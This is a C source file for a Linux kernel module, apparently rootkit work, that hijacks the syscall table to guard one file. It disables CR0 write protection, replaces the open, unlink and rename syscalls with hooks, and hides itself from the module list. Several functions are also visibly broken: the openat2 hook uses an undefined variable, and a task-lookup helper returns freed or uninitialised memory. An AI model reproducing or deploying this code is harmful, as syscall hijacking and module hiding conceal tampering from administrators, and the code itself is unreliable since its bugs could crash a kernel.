#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <linux/namei.h>
#include <asm/string.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/fs.h>

#include <asm/cacheflush.h>

#define PROTECTED_FILE "/home/oxqo/rootkit/test/do_not_modify"
#define AUTHORIZED_EXECUTABLE "/home/oxqo/rootkit/test/i_can_modify"
#define MAX_LEN_ENTRY 256
#define MAX_PATH 256

MODULE_LICENSE ("GPL");

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);

unsigned long *g_sys_call_table_p;
//global vars to save original function's address
//asmlinkage long (*original_sys_open) (const char __user * filename, int flags, int mode);
asmlinkage long (*original_sys_open) (const struct pt_regs *regs);
asmlinkage long (*original_sys_openat) (const struct pt_regs *regs);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
asmlinkage long (*original_sys_openat2) (const struct pt_regs *regs);
#endif

asmlinkage long (*original_sys_rename) (const struct pt_regs *regs);
asmlinkage long (*original_sys_renameat) (const struct pt_regs *regs);
asmlinkage long (*original_sys_renameat2) (const struct pt_regs *regs);
asmlinkage long (*original_sys_unlink) (const struct pt_regs *regs);
asmlinkage long (*original_sys_unlinkat) (const struct pt_regs *regs);


//write_cr0 denied in latest kernel
inline void write_cr0_custom(unsigned long cr0) {
    unsigned long __force_order;
    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}


void enter_kernel_addr_space(mm_segment_t *oldfs){
    *oldfs = get_fs();
    set_fs(KERNEL_DS);
}

void exit_kernel_addr_space(mm_segment_t oldfs){
    set_fs(oldfs);
}


void disable_write_protection(void){
    //write_cr0(read_cr0() & (~0x10000));
    write_cr0_custom(read_cr0() & (~0x10000));
}

void enable_write_protection(void){
    //write_cr0(read_cr0() | 0x10000);
    write_cr0_custom(read_cr0() | 0x10000);
}

void hide_module(void){
    list_del(&THIS_MODULE->list);
}

/* 
 * Retirve the address of syscall table from 
 * for kernel version >= 2.6 using file `/proc/kallsmys`
 * for kernel version < 2.6 using file `/proc/ksyms`
 */

unsigned long obtain_syscall_table(void){
    char *file_name = "/proc/kallsyms";
    int i = 0;        
    struct file *proc_ksyms = NULL;     
    char *sct_addr_str = NULL;   
    char proc_ksyms_entry[MAX_LEN_ENTRY] = {0};       
    unsigned long res = NULL;  
    char *proc_ksyms_entry_ptr = NULL;
    char *token = NULL;
    char *last = NULL;
    int read = 0;
    //mm_segment_t oldfs;
    mm_segment_t fs;


    if((sct_addr_str = (char*)kmalloc(MAX_LEN_ENTRY * sizeof(char), GFP_KERNEL)) == NULL)
        goto CLEAN_UP;
    
    if(((proc_ksyms = filp_open(file_name, O_RDONLY, 0)) || proc_ksyms) == NULL)
        goto CLEAN_UP;

    enter_kernel_addr_space(&fs);
    read = vfs_read(proc_ksyms, proc_ksyms_entry + i, 1, &(proc_ksyms->f_pos));
    exit_kernel_addr_space(fs);

    
    while( read == 1){
        if(proc_ksyms_entry[i] == '\n' || i == MAX_LEN_ENTRY){
            if(strstr(proc_ksyms_entry, "sys_call_table") != NULL){
                printk(KERN_INFO "Found Syscall table\n");
                printk(KERN_INFO "Line is:%s\n", proc_ksyms_entry);

                proc_ksyms_entry_ptr = proc_ksyms_entry;
                strncpy(sct_addr_str, strsep(&proc_ksyms_entry_ptr, " "), MAX_LEN_ENTRY);
                //strsep(&proc_ksyms_entry_ptr, " ");
                for (;(token = strsep(&proc_ksyms_entry_ptr, " ")) != NULL; last=token);
                if(strncmp("sys_call_table", last, 14) != 0)
                    continue;

                kstrtoul(sct_addr_str, 16, &res);
                goto CLEAN_UP;
            }

            i = -1;
            memset(proc_ksyms_entry, 0, MAX_LEN_ENTRY);
        }
    
        i++;
    
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,0,0)
        read = kernel_read(proc_ksyms, proc_ksyms_entry + i, 1, &(proc_ksyms->f_pos));
#else
        enter_kernel_addr_space(&fs);
        read = vfs_read(proc_ksyms, proc_ksyms_entry + i, 1, &(proc_ksyms->f_pos));
        exit_kernel_addr_space(fs);
#endif

    }


CLEAN_UP:
    if(sct_addr_str != NULL)
        kfree(sct_addr_str);
    if(proc_ksyms != NULL)
        filp_close(proc_ksyms, 0);

    return res;
}


int is_protected_file(const char __user *filename){
    int error;
    struct inode *inode,*inode_t;
    struct path f_path, protected_path;
    char f_name[MAX_PATH];
    mm_segment_t fs;

    error = kern_path(filename, LOOKUP_FOLLOW, &f_path);
    //printk(KERN_INFO"error: %d", error);
    if(error != 0)
        return 0;
    strncpy_from_user(f_name, filename, MAX_PATH-1);
    //printk(KERN_INFO"file: %s", f_name);
    if(!error){
        inode = f_path.dentry->d_inode;

        enter_kernel_addr_space(&fs);
        error=kern_path(PROTECTED_FILE, LOOKUP_FOLLOW, &protected_path);
        exit_kernel_addr_space(fs);

        if(!error){
            inode_t=protected_path.dentry->d_inode;
            if(inode==inode_t){
                return 1;
            }
        }
    } 
    return 0;
}

char* get_current_task(void){
    struct mm_struct *mm;
    struct task_struct *cr_task;
    char *pathname,*p;
    int res;
    //get current executable name
    cr_task = get_current();
    mm = cr_task->mm;
    if (mm) {
        down_read(&mm->mmap_sem);
        if (mm->exe_file) {
                    pathname = kzalloc(PATH_MAX, GFP_ATOMIC);
                    if (pathname) {
                          p = d_path(&mm->exe_file->f_path, pathname, PATH_MAX);
                    }
                }
        up_read(&mm->mmap_sem);
    }
    kfree(pathname);
    return p;
}


int is_from_authorized_task(void){
    char *p;
    int res;
    p = get_current_task();
    res = strncmp(p, AUTHORIZED_EXECUTABLE, strlen(p));
    //kfree(p);

    return res;
}

asmlinkage long sys_renameat_hook(const struct pt_regs *regs){
    const char __user *oldname = regs->si;
    char* task = get_current_task();
    if(is_protected_file(oldname)){
        printk(KERN_WARNING"unauthorized rename detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_renameat(regs);
}

asmlinkage long sys_renameat2_hook(const struct pt_regs *regs){
    const char __user *oldname = regs->si;
    char* task = get_current_task();
    if(is_protected_file(oldname)){
        printk(KERN_WARNING"unauthorized rename detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_renameat2(regs);
}

asmlinkage long sys_rename_hook (const struct pt_regs *regs){
    const char __user *oldname = regs->di;
    char* task = get_current_task();
    if(is_protected_file(oldname)){
        printk(KERN_WARNING"unauthorized rename detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_rename(regs);
}

asmlinkage long sys_unlink_hook(const struct pt_regs *regs){
    const char __user *filename = regs->di;
    char* task = get_current_task();
    if(is_protected_file(filename)){
        printk(KERN_WARNING"unauthorized delete detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_unlink(regs);
}

asmlinkage long sys_unlinkat_hook(const struct pt_regs *regs){
    const char __user *pathname = regs->si;
    char* task = get_current_task();
    if(is_protected_file(pathname)){
        printk(KERN_WARNING"unauthorized delete detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_unlinkat(regs);
}

asmlinkage long sys_open_hook(const struct pt_regs * regs){
    const char __user *filename = regs->di;
    int flags = regs->si;
    char* task = get_current_task();
    //                                  if write access
    if(is_protected_file(filename) && ((flags & O_ACCMODE) != O_RDONLY) && is_from_authorized_task() != 0){
        printk(KERN_WARNING"unauthorized open detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_open(regs);
}

asmlinkage long sys_openat_hook(const struct pt_regs *regs){
    const char __user *filename = regs->si;
    int flags = regs->dx;
    char* task = get_current_task();
    //printk(KERN_INFO"Hook Suc");
    //                                  if write access
    if(is_protected_file(filename) && ((flags & O_ACCMODE) != O_RDONLY) && is_from_authorized_task() != 0){
        printk(KERN_WARNING"unauthorized open detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_openat(regs);
}
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
asmlinkage long sys_openat2_hook (int dfd, const char __user *filename, struct open_how __user* how, size_t usize){
    const char __user *filename = regs->si;
    struct open_how __user *how= regs->dx;
    char* task = get_current_task();
    if(is_protected_file(filename) && ((how->flags & O_ACCMODE) != O_RDONLY) && is_from_authorized_task() != 0){
        printk(KERN_WARNING"unauthorized open detected: %s\n", task);
        return -EACCES;
    }
    return original_sys_openat2(regs);
}
#endif
    
static int __init mod_init (void){
    //kallsyms_lookup_name fails on some kernel versions
    //g_sys_call_table_p = (unsigned long *)obtain_syscall_table();
    g_sys_call_table_p = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    printk(KERN_INFO"sys_call_table: %llx, %p\n", g_sys_call_table_p, g_sys_call_table_p+0x10);
    printk(KERN_INFO"before: %llx\n", g_sys_call_table_p[__NR_open]);
    //turn off write protection
    disable_write_protection();
    //set_memory_rw(g_sys_call_table_p, 1);
    if(g_sys_call_table_p != NULL){
        original_sys_open = g_sys_call_table_p[__NR_open];
        g_sys_call_table_p[__NR_open] = (unsigned long)sys_open_hook;
        original_sys_openat = g_sys_call_table_p[__NR_openat];
        g_sys_call_table_p[__NR_openat] = (unsigned long)sys_openat_hook;
        printk(KERN_INFO"%s\n%llx\n%llx\n", "addresses:", original_sys_open, original_sys_openat);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
        original_sys_openat2 = g_sys_call_table_p[__NR_openat2];
        g_sys_call_table_p[__NR_openat2] = (unsigned long)sys_openat2_hook;
#endif
        original_sys_unlink = g_sys_call_table_p[__NR_unlink];
        g_sys_call_table_p[__NR_unlink] = (unsigned long)sys_unlink_hook;
        original_sys_unlinkat = g_sys_call_table_p[__NR_unlinkat];
        g_sys_call_table_p[__NR_unlinkat] = (unsigned long)sys_unlinkat_hook;

        original_sys_rename = g_sys_call_table_p[__NR_rename];
        g_sys_call_table_p[__NR_rename] = (unsigned long)sys_rename_hook;
        original_sys_renameat = g_sys_call_table_p[__NR_renameat];
        g_sys_call_table_p[__NR_renameat] = (unsigned long)sys_renameat_hook;
        original_sys_renameat2 = g_sys_call_table_p[__NR_renameat2];
        g_sys_call_table_p[__NR_renameat2] = (unsigned long)sys_renameat2_hook;

    }
    printk(KERN_INFO"after: %llx\n", g_sys_call_table_p[__NR_open]);
    hide_module();
    //restore write protection
    enable_write_protection();
    //set_memory_ro(g_sys_call_table_p, 1);
                
    return 0;

}
    
static void mod_exit (void){
    disable_write_protection();
    //set_memory_rw(g_sys_call_table_p, 1);
    g_sys_call_table_p[__NR_open] = original_sys_open;
    g_sys_call_table_p[__NR_openat]= original_sys_openat;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
    g_sys_call_table_p[__NR_openat2] = original_sys_openat2;
#endif

    g_sys_call_table_p[__NR_unlink] = original_sys_unlink;
    g_sys_call_table_p[__NR_unlinkat] = original_sys_unlinkat;

    g_sys_call_table_p[__NR_rename] = original_sys_rename;
    g_sys_call_table_p[__NR_renameat] = original_sys_renameat;
    g_sys_call_table_p[__NR_renameat2] = original_sys_renameat2;
    enable_write_protection();
    //set_memory_ro(g_sys_call_table_p, 1);
}
    
module_init(mod_init);
module_exit(mod_exit);